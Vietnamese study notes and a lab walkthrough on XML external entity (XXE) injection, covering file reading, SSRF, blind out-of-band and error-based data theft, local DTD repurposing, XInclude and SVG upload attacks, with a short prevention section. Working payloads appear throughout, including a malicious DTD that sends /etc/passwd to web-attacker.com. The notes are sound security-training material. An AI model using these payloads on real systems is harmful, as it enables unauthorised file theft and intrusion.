```table-of-contents
```

# Giới thiệu


XML external entity injection (còn được gọi là XXE) là một lỗ hổng bảo mật web cho phép kẻ tấn công can thiệp vào quá trình ứng dụng xử lý dữ liệu XML. Nó thường cho phép kẻ tấn công xem các tệp trên hệ thống tệp của máy chủ ứng dụng, và tương tác với bất kỳ hệ thống back-end hoặc hệ thống bên ngoài nào mà chính ứng dụng có thể truy cập.

Trong một số tình huống, kẻ tấn công có thể leo thang một cuộc tấn công XXE để xâm phạm máy chủ nền tảng hoặc cơ sở hạ tầng back-end khác, bằng cách lợi dụng lỗ hổng XXE để thực hiện các cuộc tấn công giả mạo yêu cầu phía máy chủ (SSRF).
![[Pasted image 20260502164756.png]]
# XXE


## XML là gì?


XML viết tắt của “Extensible Markup Language” (ngôn ngữ đánh dấu mở rộng). XML là một ngôn ngữ được thiết kế để lưu trữ và truyền tải dữ liệu. Giống như HTML, XML sử dụng cấu trúc dạng cây gồm các thẻ (tag) và dữ liệu. Khác với HTML, XML không dùng các thẻ được định nghĩa sẵn, vì vậy các thẻ có thể được đặt tên để mô tả dữ liệu. Trước đây trong lịch sử web, XML từng thịnh hành như một định dạng truyền tải dữ liệu (chữ “X” trong “AJAX” là viết tắt của “XML”). Nhưng hiện nay độ phổ biến của nó đã suy giảm, nhường chỗ cho định dạng JSON.

## XML entities là gì?


XML entities là một cách biểu diễn một mục dữ liệu trong tài liệu XML thay vì sử dụng trực tiếp dữ liệu đó. Trong đặc tả của ngôn ngữ XML có sẵn nhiều entity được định nghĩa.

Ví dụ, các entity `&lt;` và `&gt;` lần lượt đại diện cho các ký tự `<` và `>`. Đây là các metacharacter dùng để đánh dấu thẻ XML, nên thường phải được biểu diễn thông qua entity khi chúng xuất hiện trong dữ liệu.


## Document Type Definition là gì?

---

Document Type Definition (DTD) trong XML chứa các khai báo dùng để định nghĩa cấu trúc của một tài liệu XML, các kiểu giá trị dữ liệu mà nó có thể chứa, và những thành phần khác.

DTD được khai báo trong phần tử tùy chọn **DOCTYPE** ở đầu tài liệu XML.

- Nếu DTD được chứa hoàn toàn trong chính tài liệu, nó được gọi là **internal DTD** (DTD nội bộ).
- Nếu DTD được tải từ bên ngoài, nó được gọi là **external DTD** (DTD bên ngoài).
- Ngoài ra, cũng có thể sử dụng kiểu **lai (hybrid DTD)**, tức là kết hợp cả nội bộ và bên ngoài.

---

## XML custom entities là gì?

---

XML cho phép định nghĩa các thực thể (entity) tùy chỉnh trong DTD. Ví dụ:

```xml
<!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>
```

Định nghĩa này có nghĩa là mọi chỗ sử dụng tham chiếu thực thể `&myentity;` trong tài liệu XML sẽ được thay thế bằng giá trị đã định nghĩa: `"my entity value"`.

---

## XML external entities là gì?

---

XML external entities (thực thể bên ngoài trong XML) là một loại **custom entity** (thực thể tùy chỉnh) mà định nghĩa của chúng nằm bên ngoài DTD nơi chúng được khai báo.

Việc khai báo một external entity sử dụng từ khóa **SYSTEM** và phải chỉ định một URL từ đó giá trị của entity sẽ được nạp. Ví dụ:

```xml
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "<http://normal-website.com>" > ]>
```

URL này có thể sử dụng giao thức `file://`, vì vậy external entities cũng có thể được nạp từ tệp trong hệ thống. Ví dụ:

```xml
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>
```

XML external entities chính là phương thức chủ yếu dẫn đến các cuộc tấn công **XML external entity (XXE) injection**.

---

# Nguyên nhân

---

Một số ứng dụng sử dụng định dạng XML để truyền dữ liệu giữa trình duyệt và máy chủ. Các ứng dụng này gần như luôn dùng thư viện chuẩn hoặc API của nền tảng để xử lý dữ liệu XML trên máy chủ.

Lỗ hổng **XXE** phát sinh bởi vì đặc tả XML chứa nhiều tính năng tiềm ẩn nguy hiểm, và các trình phân tích (parser) chuẩn thường hỗ trợ những tính năng này ngay cả khi ứng dụng không thực sự cần dùng đến.

> **Tìm hiểu thêm**
> 
> - **XML format, DTDs, và external entities**
>     
>     XML external entities là một loại **custom entity** trong XML, có giá trị được nạp từ bên ngoài DTD nơi chúng được khai báo.
>     
> - Về mặt bảo mật, external entities đặc biệt đáng chú ý vì chúng cho phép định nghĩa entity dựa trên nội dung từ một **đường dẫn tệp (file path)** hoặc một **URL**, đây chính là cơ sở của các cuộc tấn công XXE.
>     

---

# Kiểm thử lỗ hổng

---

Phần lớn các lỗ hổng XXE có thể được phát hiện nhanh chóng và đáng tin cậy bằng trình quét lỗ hổng web của Burp Suite.

Việc kiểm thử thủ công cho lỗ hổng XXE thường bao gồm:

- Kiểm thử khả năng đọc tệp bằng cách định nghĩa một external entity dựa trên một tệp hệ điều hành quen thuộc và sử dụng entity đó trong dữ liệu được trả về trong phản hồi của ứng dụng.
- Kiểm thử **blind XXE** bằng cách định nghĩa một external entity trỏ tới một URL thuộc hệ thống do bạn kiểm soát, rồi theo dõi các tương tác với hệ thống đó. **Burp Collaborator** rất phù hợp cho mục đích này.
- Kiểm thử việc ứng dụng chèn dữ liệu không-XML do người dùng cung cấp vào trong tài liệu XML phía máy chủ một cách không an toàn bằng cách sử dụng tấn công **XInclude** để cố gắng lấy về một tệp hệ điều hành quen thuộc.

> **Lưu ý**
> 
> Hãy nhớ rằng XML chỉ là một định dạng truyền dữ liệu. Đảm bảo bạn cũng kiểm thử mọi chức năng dựa trên XML cho các lỗ hổng khác như XSS và SQL injection. Bạn có thể cần mã hóa payload bằng các chuỗi escape của XML để tránh làm hỏng cú pháp, nhưng bạn cũng có thể tận dụng điều này để làm nhiễu (obfuscate) cuộc tấn công nhằm vượt qua những cơ chế phòng thủ yếu.

---

# Lỗ hổng

---

Có nhiều dạng tấn công XXE khác nhau, bao gồm:

- **XXE để đọc tệp (File Retrieval):** định nghĩa một external entity chứa nội dung của một tệp và trả về trong phản hồi của ứng dụng.
- **XXE để thực hiện SSRF (Server-Side Request Forgery):** định nghĩa một external entity trỏ tới một URL thuộc hệ thống back-end.
- **Blind XXE để rò rỉ dữ liệu ngoài băng (Out-of-band exfiltration):** dữ liệu nhạy cảm được gửi từ máy chủ ứng dụng tới hệ thống do kẻ tấn công kiểm soát.
- **Blind XXE để lấy dữ liệu qua thông báo lỗi:** kẻ tấn công kích hoạt lỗi phân tích cú pháp (parsing error) chứa dữ liệu nhạy cảm.

---

## **Khai thác XXE để đọc tệp từ máy chủ**

---

Để thực hiện một cuộc tấn công **XXE injection** nhằm đọc một tệp tùy ý từ hệ thống tệp của máy chủ, bạn cần chỉnh sửa XML gửi đi theo hai bước:

1. **Thêm (hoặc chỉnh sửa) phần tử DOCTYPE** để định nghĩa một external entity chứa đường dẫn tới tệp cần đọc.
2. **Chỉnh sửa giá trị dữ liệu trong XML** (giá trị này sẽ được phản hồi lại trong response) để sử dụng external entity đã định nghĩa.

Ví dụ

Giả sử một ứng dụng mua sắm kiểm tra số lượng hàng tồn kho bằng cách gửi XML sau tới máy chủ:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
```

Ứng dụng này không có biện pháp phòng thủ đặc biệt chống XXE. Bạn có thể khai thác để đọc tệp `/etc/passwd` bằng payload sau:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

Payload này định nghĩa một external entity `&xxe;` với giá trị là nội dung của tệp `/etc/passwd`, sau đó sử dụng entity này trong thẻ `<productId>`. Điều này khiến phản hồi từ ứng dụng bao gồm nội dung của tệp:

```
Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

> **Lưu ý**
> 
> Trong các lỗ hổng XXE thực tế, tài liệu XML gửi đi thường có nhiều trường dữ liệu. Bất kỳ trường nào trong số đó cũng có thể được phản hồi lại trong ứng dụng.

👉 Để kiểm thử một cách hệ thống, bạn cần test **từng nút dữ liệu trong XML** với entity đã định nghĩa, rồi quan sát xem nó có xuất hiện trong response hay không.


---

## SSRF

---

Ngoài việc đọc dữ liệu nhạy cảm, tác động chính khác của XXE là có thể được sử dụng để thực hiện **Server-Side Request Forgery (SSRF)**. Đây là một lỗ hổng nghiêm trọng, trong đó ứng dụng phía máy chủ có thể bị buộc gửi các yêu cầu HTTP tới bất kỳ URL nào mà máy chủ có thể truy cập.

Cách khai thác XXE để thực hiện SSRF

- Định nghĩa một **external XML entity** với URL mà bạn muốn tấn công.
- Sử dụng entity đó trong một giá trị dữ liệu.

Nếu entity được sử dụng trong một giá trị **xuất hiện trong phản hồi của ứng dụng**, bạn có thể xem được phản hồi từ URL đích trong chính phản hồi ứng dụng → nghĩa là bạn có **tương tác hai chiều** với hệ thống back-end.

Nếu không, bạn vẫn có thể thực hiện **blind SSRF** (tức chỉ gửi request mà không thấy phản hồi), nhưng điều này **vẫn có thể gây hậu quả nghiêm trọng**.

Ví dụ

Trong ví dụ dưới đây, external entity sẽ buộc máy chủ gửi một HTTP request tới hệ thống nội bộ trong hạ tầng của tổ chức:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "<http://internal.vulnerable-website.com/>"> ]>
```

---

## Blind XXE

---

**Blind XXE** xuất hiện khi ứng dụng tồn tại lỗ hổng XXE injection nhưng **không phản hồi lại giá trị của các external entity đã định nghĩa** trong response. Điều này có nghĩa là bạn **không thể trực tiếp đọc file từ phía máy chủ**, khiến việc khai thác blind XXE khó khăn hơn so với XXE thông thường.

Hai cách chính để tìm và khai thác blind XXE:

1. **Kích hoạt các tương tác mạng ngoài băng (out-of-band network interactions):**
    - Máy chủ gửi request ra ngoài theo payload XXE do bạn kiểm soát.
    - Bạn có thể lợi dụng để **rò rỉ dữ liệu nhạy cảm trong request**.
2. **Kích hoạt lỗi phân tích XML (XML parsing errors):**
    - Cố tình tạo ra lỗi khi parser xử lý XML.
    - Thông báo lỗi được trả về có thể chứa **dữ liệu nhạy cảm**.

---

### OAST

---

Bạn có thể phát hiện blind XXE bằng cách tương tự như với tấn công **XXE SSRF**, nhưng thay vì chờ phản hồi trong ứng dụng, bạn theo dõi các **tương tác mạng ngoài băng (out-of-band)** tới hệ thống do bạn kiểm soát.

Ví dụ

Định nghĩa một external entity như sau:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "<http://f2g9j7hhkax.web-attacker.com>"> ]>
```

Sau đó, sử dụng entity đã định nghĩa này trong một giá trị dữ liệu trong XML.

Kết quả

Payload này buộc máy chủ gửi một **HTTP request từ back-end** đến URL chỉ định.

- Kẻ tấn công có thể theo dõi **DNS lookup** và **HTTP request** đến máy chủ mình kiểm soát.
- Nếu có request đến, điều đó chứng tỏ **tấn công XXE đã thành công**, dù ứng dụng không trả về dữ liệu trực tiếp.

Đôi khi, tấn công XXE bằng **regular entities** bị chặn, do ứng dụng có cơ chế kiểm tra đầu vào hoặc do trình phân tích XML (parser) đã được cấu hình hạn chế. Trong tình huống này, bạn có thể thử dùng **XML parameter entities**.

Parameter entities là một loại **XML entity đặc biệt**, chỉ có thể được tham chiếu ở bên trong **DTD**.

Có 2 điểm cần nhớ:

1. Khi khai báo parameter entity, tên entity phải có ký tự phần trăm (`%`) ở phía trước:
    
    ```xml
    <!ENTITY % myparameterentity "my parameter entity value" >
    ```
    
2. Khi tham chiếu parameter entity, cũng phải dùng ký tự `%` thay vì dấu `&`:
    
    ```xml
    %myparameterentity;
    ```
    

Ví dụ payload kiểm thử blind XXE bằng parameter entity

```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "<http://f2g9j7hhkax.web-attacker.com>"> %xxe; ]>
```

- Payload này khai báo một **parameter entity** tên là `xxe`.
- Sau đó tham chiếu entity này ngay trong **DTD**.
- Kết quả: máy chủ sẽ thực hiện **DNS lookup** và gửi **HTTP request** tới domain của kẻ tấn công, xác nhận rằng tấn công thành công.

---

### Khai thác dữ liệu bằng OAST

---

Phát hiện lỗ hổng blind XXE bằng các kỹ thuật ngoài băng là rất tốt, nhưng điều này không thực sự chứng minh cách lỗ hổng có thể bị khai thác. Điều mà kẻ tấn công thực sự muốn đạt được là exfiltrate dữ liệu nhạy cảm. Điều này có thể thực hiện được thông qua lỗ hổng blind XXE, nhưng nó đòi hỏi kẻ tấn công phải lưu trữ một DTD độc hại trên hệ thống do họ kiểm soát, rồi gọi DTD bên ngoài này từ trong payload XXE in-band.

Một ví dụ về DTD độc hại để exfiltrate nội dung tệp `/etc/passwd` như sau:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

DTD này thực hiện các bước sau:

- Định nghĩa một XML parameter entity tên là `file`, chứa nội dung của tệp `/etc/passwd`.
- Định nghĩa một XML parameter entity tên là `eval`, chứa một khai báo động của một XML parameter entity khác tên là `exfiltrate`. Entity `exfiltrate` sẽ được đánh giá bằng cách thực hiện một HTTP request đến máy chủ web của kẻ tấn công, trong đó có chứa giá trị của entity `file` trong chuỗi truy vấn URL.
- Sử dụng entity `eval`, khiến việc khai báo động của entity `exfiltrate` được thực thi.
- Sử dụng entity `exfiltrate`, để giá trị của nó được đánh giá bằng cách yêu cầu tới URL đã chỉ định.

Sau đó, kẻ tấn công phải lưu trữ DTD độc hại này trên một hệ thống do họ kiểm soát, thường là tải nó lên máy chủ web của chính họ. Ví dụ, kẻ tấn công có thể phục vụ DTD độc hại tại URL sau:

```
<http://web-attacker.com/malicious.dtd>
```

Cuối cùng, kẻ tấn công phải gửi payload XXE sau tới ứng dụng dễ bị tấn công:

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"<http://web-attacker.com/malicious.dtd>"> %xxe;]>
```

Payload XXE này khai báo một XML parameter entity tên là `xxe` và sau đó sử dụng entity này trong DTD. Điều này sẽ khiến XML parser tải DTD bên ngoài từ máy chủ của kẻ tấn công và diễn giải nó inline. Các bước được định nghĩa trong DTD độc hại sau đó được thực thi, và tệp `/etc/passwd` được truyền về máy chủ của kẻ tấn công.

> **Lưu ý**
> 
> Kỹ thuật này có thể không hoạt động với một số nội dung tệp, bao gồm các ký tự xuống dòng (newline) có trong tệp `/etc/passwd`. Nguyên nhân là một số XML parser lấy URL trong định nghĩa external entity thông qua một API kiểm tra hợp lệ các ký tự được phép xuất hiện trong URL. Trong tình huống này, có thể dùng giao thức **FTP** thay cho **HTTP**. Đôi khi sẽ không thể exfiltrate dữ liệu chứa ký tự xuống dòng, khi đó có thể nhắm tới một tệp như `/etc/hostname` thay thế.

---

### Khai thác dữ liệu bằng Error

---

Một cách tiếp cận khác để khai thác blind XXE là kích hoạt lỗi phân tích XML (XML parsing error) trong đó thông báo lỗi chứa dữ liệu nhạy cảm mà bạn muốn lấy. Cách này hiệu quả nếu ứng dụng trả về thông báo lỗi trong phản hồi của nó.

Bạn có thể kích hoạt thông báo lỗi phân tích XML chứa nội dung của tệp `/etc/passwd` bằng cách sử dụng một external DTD độc hại như sau:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

DTD này thực hiện các bước sau:

- Định nghĩa một XML parameter entity tên `file`, chứa nội dung của tệp `/etc/passwd`.
- Định nghĩa một XML parameter entity tên `eval`, chứa một khai báo động của một XML parameter entity khác tên `error`. Entity `error` sẽ được đánh giá bằng cách tải một tệp không tồn tại có tên chứa giá trị của entity `file`.
- Sử dụng entity `eval`, khiến việc khai báo động của entity `error` được thực hiện.
- Sử dụng entity `error`, để giá trị của nó được đánh giá bằng cách cố gắng tải tệp không tồn tại, dẫn đến thông báo lỗi chứa tên tệp không tồn tại, chính là nội dung của tệp `/etc/passwd`.

Gọi tới external DTD độc hại sẽ tạo ra một thông báo lỗi giống như sau:

```
java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

---

## Tái sử dụng DTD cục bộ

---

Kỹ thuật trước hoạt động tốt với một **external DTD**, nhưng thông thường sẽ không hoạt động với một **internal DTD** được chỉ định đầy đủ trong phần tử **DOCTYPE**. Lý do là kỹ thuật này liên quan đến việc sử dụng **XML parameter entity** bên trong định nghĩa của một parameter entity khác. Theo đặc tả XML, điều này được phép trong **external DTD** nhưng **không** trong **internal DTD**. (Một số parser có thể chấp nhận, nhưng nhiều parser thì không.)

Vậy còn các lỗ hổng blind XXE khi các tương tác out-of-band bị chặn thì sao? Bạn không thể exfiltrate dữ liệu qua một kết nối out-of-band, và bạn cũng không thể nạp một external DTD từ máy chủ từ xa.

Trong tình huống này, vẫn có thể kích hoạt các thông báo lỗi chứa dữ liệu nhạy cảm nhờ một kẽ hở trong đặc tả ngôn ngữ XML. Nếu DTD của tài liệu sử dụng **lai (hybrid)** giữa internal và external DTD, thì **internal DTD có thể định nghĩa lại (redefine)** các entity đã được khai báo trong external DTD. Khi điều này xảy ra, **ràng buộc** về việc sử dụng một XML parameter entity bên trong định nghĩa của một parameter entity khác **được nới lỏng**.

Điều này có nghĩa là kẻ tấn công có thể áp dụng kỹ thuật **error-based XXE** từ bên trong một **internal DTD**, với điều kiện **XML parameter entity** được sử dụng là **định nghĩa lại** (redefine) một entity đã được khai báo trong **external DTD**. Dĩ nhiên, nếu các kết nối out-of-band bị chặn, thì **external DTD không thể được nạp từ vị trí từ xa**. Thay vào đó, nó cần phải là một **tệp DTD nằm cục bộ** trên máy chủ ứng dụng. Về bản chất, cuộc tấn công liên quan đến việc **gọi một tệp DTD vốn đã tồn tại** trên hệ thống tệp cục bộ và **tái sử dụng** nó để định nghĩa lại một entity hiện có theo cách kích hoạt lỗi parsing chứa dữ liệu nhạy cảm. Kỹ thuật này được tiên phong bởi **Arseniy Sharoglazov**, và xếp hạng **#7** trong **top 10 kỹ thuật web hacking năm 2018** của chúng tôi.

Ví dụ, giả sử có một tệp DTD trên hệ thống tệp máy chủ tại vị trí `/usr/local/app/schema.dtd`, và tệp DTD này định nghĩa một entity tên là `custom_entity`. Kẻ tấn công có thể kích hoạt thông báo lỗi phân tích XML chứa nội dung của tệp `/etc/passwd` bằng cách gửi một DTD lai như sau:

```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

DTD này thực hiện các bước sau:

- Định nghĩa một **XML parameter entity** tên `local_dtd`, chứa nội dung của tệp external DTD tồn tại trên hệ thống máy chủ.
- **Định nghĩa lại (redefine)** XML parameter entity tên `custom_entity`, vốn đã được định nghĩa trong tệp external DTD. Entity này được định nghĩa lại để chứa payload **error-based XXE** đã mô tả trước đó, nhằm kích hoạt thông báo lỗi chứa nội dung của tệp `/etc/passwd`.
- Sử dụng entity `local_dtd`, để external DTD được diễn giải, bao gồm cả giá trị đã định nghĩa lại của entity `custom_entity`. Điều này dẫn đến thông báo lỗi mong muốn.

Vì kiểu tấn công XXE này liên quan đến việc **tái sử dụng một DTD có sẵn trên hệ thống máy chủ**, yêu cầu then chốt là phải tìm được một tệp phù hợp.

Điều này thực ra khá đơn giản. Bởi vì ứng dụng trả về bất kỳ thông báo lỗi nào do XML parser tạo ra, bạn có thể dễ dàng **liệt kê (enumerate) các tệp DTD cục bộ** chỉ bằng cách thử nạp chúng từ trong internal DTD.

Ví dụ:

Trên các hệ thống Linux sử dụng môi trường desktop **GNOME**, thường có một tệp DTD tại:

```
/usr/share/yelp/dtd/docbookx.dtd
```

Bạn có thể kiểm tra xem tệp này có tồn tại hay không bằng cách gửi payload XXE sau. Payload này sẽ gây lỗi nếu tệp không tồn tại:

```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```

Sau khi bạn đã thử một danh sách các tệp DTD phổ biến và xác định được một tệp có tồn tại, bạn cần:

1. **Tải về một bản sao của tệp đó**.
2. **Xem xét nội dung** để tìm một entity có thể định nghĩa lại (redefine).

Do nhiều hệ thống phổ biến chứa DTD là **mã nguồn mở**, bạn thường có thể dễ dàng tìm và tải các bản sao DTD này chỉ bằng cách tìm kiếm trên internet.

---

# Xác định bề mặt tấn công ẩn cho XXE injection

---

Trong nhiều trường hợp, **bề mặt tấn công (attack surface)** của XXE injection khá rõ ràng, vì lưu lượng HTTP bình thường của ứng dụng có chứa các request có dữ liệu ở định dạng XML.

Tuy nhiên, trong một số trường hợp khác, bề mặt tấn công ít hiển thị hơn. Dù vậy, nếu tìm đúng chỗ, bạn sẽ phát hiện ra **bề mặt tấn công XXE** ngay cả trong những request không hề chứa XML.

---

## **XInclude attacks**

---

Một số ứng dụng nhận dữ liệu từ phía client, nhúng dữ liệu đó vào trong một tài liệu XML ở phía server, rồi tiến hành phân tích tài liệu này. Ví dụ điển hình là khi dữ liệu từ client được đưa vào một **SOAP request** ở back-end, sau đó được dịch vụ SOAP xử lý.

Trong tình huống này, bạn không thể thực hiện tấn công XXE cổ điển, vì bạn không kiểm soát toàn bộ tài liệu XML nên không thể định nghĩa hoặc chỉnh sửa phần tử **DOCTYPE**. Tuy nhiên, bạn có thể lợi dụng **XInclude**.

**XInclude** là một phần trong đặc tả XML, cho phép một tài liệu XML được xây dựng từ các tài liệu con. Bạn có thể đặt payload XInclude trong bất kỳ giá trị dữ liệu nào trong tài liệu XML. Do đó, tấn công này có thể được thực hiện ngay cả khi bạn chỉ kiểm soát **một phần tử dữ liệu duy nhất** được đưa vào XML phía server.

Cách thực hiện:

Bạn cần tham chiếu tới namespace của XInclude và cung cấp đường dẫn đến tệp mà bạn muốn chèn.

Ví dụ payload:

```xml
<foo xmlns:xi="<http://www.w3.org/2001/XInclude>">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

Payload trên sẽ cố gắng chèn nội dung của tệp `/etc/passwd` vào trong tài liệu XML.

---

## XXE thông qua file upload

---

Một số ứng dụng cho phép người dùng tải tệp lên, sau đó các tệp này được xử lý ở phía server. Một số định dạng tệp phổ biến được xây dựng dựa trên **XML** hoặc chứa các thành phần phụ (subcomponent) dạng XML.

Ví dụ về các định dạng dựa trên XML:

- Các định dạng tài liệu văn phòng như **DOCX**
- Các định dạng hình ảnh như **SVG**

Ví dụ:

Ứng dụng cho phép người dùng tải hình ảnh lên và thực hiện xử lý hoặc xác thực tệp sau khi upload.

- Dù ứng dụng mong đợi nhận tệp **PNG** hoặc **JPEG**, nhưng thư viện xử lý ảnh mà nó sử dụng có thể hỗ trợ cả **SVG**.
- Do **SVG** sử dụng XML, kẻ tấn công có thể nộp một **tệp SVG độc hại** để khai thác bề mặt tấn công ẩn, dẫn đến lỗ hổng **XXE**.

Cách tấn công:

Có thể chèn đoạn XML sau vào ảnh SVG

```xml
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="<http://www.w3.org/2000/svg>" xmlns:xlink="<http://www.w3.org/1999/xlink>" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

---

## XXE thông qua sửa đổi Content-Type

---

Hầu hết các request **POST** sử dụng content type mặc định được sinh ra bởi HTML form, chẳng hạn như:

```
application/x-www-form-urlencoded
```

Một số website mong đợi nhận request ở định dạng này, nhưng lại **chấp nhận các content type khác**, bao gồm cả **XML**.

Ví dụ:

Request bình thường:

```
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```

Có thể được thay thế bằng:

```
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```

Nếu ứng dụng **chấp nhận request có nội dung XML** trong body và thực hiện **parse XML**, thì bạn đã có thể khai thác được **bề mặt tấn công XXE ẩn** chỉ bằng cách **chuyển đổi định dạng request sang XML**.

---

# Phòng tránh

---

Hầu hết các lỗ hổng XXE xuất hiện vì **thư viện phân tích XML (XML parser)** của ứng dụng hỗ trợ các tính năng nguy hiểm mà ứng dụng **không cần** hoặc **không có ý định sử dụng**.

Cách đơn giản và hiệu quả nhất để ngăn chặn tấn công XXE là **vô hiệu hóa các tính năng này**.

Best practices

- **Tắt khả năng xử lý external entities**.
- **Tắt hỗ trợ XInclude**.

Điều này thường có thể thực hiện thông qua:

- **Cấu hình (configuration options)** trong parser.
- Hoặc **override hành vi mặc định** bằng code.

👉 Hãy tham khảo tài liệu của thư viện XML hoặc API bạn đang dùng để biết chi tiết cách vô hiệu hóa các tính năng không cần thiết này.

# WU
- [x] Exploiting XXE using external entities to retrieve files
- [x] Exploiting XXE to perform SSRF attacks
- [x] Blind XXE with out-of-band interaction
- [x] Blind XXE with out-of-band interaction via XML parameter entities
- [x] Exploiting blind XXE to exfiltrate data using a malicious external DTD
- [x] Exploiting blind XXE to retrieve data via error messages
- [x] Exploiting XXE to retrieve data by repurposing a local DTD
- [x] Exploiting XInclude to retrieve files
- [x] Exploiting XXE via image file upload

## Exploiting XXE using external entities to retrieve files
 - bài lab này có chức năng checkstock  lấy input XML,  ta cần chèn XML external entiites để lấy nội dung của tệp /etc/passwd.
![[Pasted image 20260502173558.png]]

![[Pasted image 20260502173827.png]]
- giải thích: 
- **DOCTYPE**:  là nơi  định nghĩa cấu trúc của tài liệu XML (Document Type Definition - DTD).
- **ENTITY xxe**: tạo ra một "biến" tên là `xxe`. Từ khóa `SYSTEM` ra lệnh cho trình phân tích XML (XML Parser) đi tìm nội dung từ một nguồn bên ngoài.
- **file:///etc/passwd**: Đây là đường dẫn URI trỏ đến file nhạy cảm trên hệ thống Linux.
- **&xxe;**: Khi thay `productId` bằng thực thể này, Parser sẽ lấy toàn bộ nội dung của file `/etc/passwd` và "đổ" vào vị trí đó.

## Exploiting XXE to perform SSRF attacks
ơ bài lab này, hay vì dùng XXE để đọc file hệ thống, ta sẽ biến Server của nạn nhân thành một "trạm trung chuyển" để gửi các truy vấn đến các dịch vụ bên trong mạng nội bộ mà chúng ta không thể tiếp cận trực tiếp từ bên ngoài.

![[Pasted image 20260502174214.png]]

![[Pasted image 20260502174353.png]]

## Blind XXE with out-of-band interaction
- ở bài lab này Server vẫn xử lý XML nhạy cảm, nhưng nó **không bao giờ trả về nội dung lỗi hay nội dung thực thể** trong phản hồi (Response)
- cần sử dụng burp colla
![[Pasted image 20260502174736.png]]

![[Pasted image 20260502174745.png]]


## Blind XXE with out-of-band interaction via XML parameter entities
- ở bài lab này hay vì dùng thực thể thông thường (General Entities), chúng ta sẽ sử dụng **XML Parameter Entities**
- Sự khác biệt lớn nhất giữa General Entity và Parameter Entity là:
	- **General Entity:** Dùng dấu `&` và được sử dụng trong nội dung của tài liệu XML.
	- **Parameter Entity:** Dùng dấu `%` và **chỉ được phép sử dụng bên trong DTD**.

![[Pasted image 20260502175113.png]]
- có thể thấy là dấu & đã bị chặn
![[Pasted image 20260502175240.png]]
![[Pasted image 20260502175247.png]]

## Exploiting blind XXE to exfiltrate data using a malicious external DTD
- ở bài lab này, vì server không trả về dữ liệu trong Response, chúng ta sẽ lừa nó gửi dữ liệu đó đến Server của chúng ta thông qua URL. Quy trình gồm 3 bước lồng nhau:
1. **Bước 1:** Server nạn nhân tải một file DTD độc hại từ Exploit Server của bạn.
2. **Bước 2:** File DTD này ra lệnh cho Server nạn nhân đọc một file hệ thống (ví dụ: `/etc/hostname`).
3. **Bước 3:** Nội dung file đó được "gắn" vào một URL và Server nạn nhân sẽ truy cập URL đó đến Collaborator của bạn.


![[Pasted image 20260502175807.png]]

- copy đoạn script bài lab gợi ý và đưa vào body trong trang exploit (nhớ thay phần url thành địa chỉ của burp colla) và ấn stored để tạo 1 url
![[Pasted image 20260502180023.png]]

- quay lại burp repeater để chèn url vào và send, ở bên burp colla ấn poll now
- thấy ở burp colla, có 1 request get chứa hostname
![[Pasted image 20260502180032.png]]

## Exploiting blind XXE to retrieve data via error messages
- ở bài lab này, ta sử dụng kĩ thuật error-based XXE
ta sẽ: 
- Đọc nội dung file nhạy cảm vào một thực thể.
- Dùng nội dung đó để tạo ra một đường dẫn file **không hợp lệ**.
- Server khi cố gắng truy cập đường dẫn "ma" này sẽ gặp lỗi và in toàn bộ đường dẫn đó (chính là nội dung file) vào thông báo lỗi trả về cho ta.

- copy đoạn mã bài lab cung cấp và ấn stored đẻ tạo 1 url
![[Pasted image 20260502180811.png]]

- sử dụng %, dấu & đã bị block
![[Pasted image 20260502181032.png]]


## Exploiting XInclude to retrieve files
- ở bài lab này, **không thể** can thiệp vào toàn bộ tài liệu XML (không chèn được `DOCTYPE`), mà chỉ có thể kiểm soát một phần dữ liệu nhỏ được đưa vào một tài liệu XML lớn ở phía Server.
**XInclude** là một phần của tiêu chuẩn XML cho phép xây dựng một tài liệu XML từ các phần nhỏ riêng biệt.
- **Vấn đề:** Nếu Server cho phép sử dụng XInclude trong input, bạn có thể dùng thẻ `<xi:include>` để yêu cầu Server nhúng nội dung của một file hệ thống vào tài liệu XML đó.
- Dùng **XInclude** Vì không cần khai báo `DOCTYPE` hay `ENTITY`. tachỉ cần chèn một đoạn code ngắn ngay tại vị trí input thông thường.


![[Pasted image 20260502181354.png]]

**Payload:**

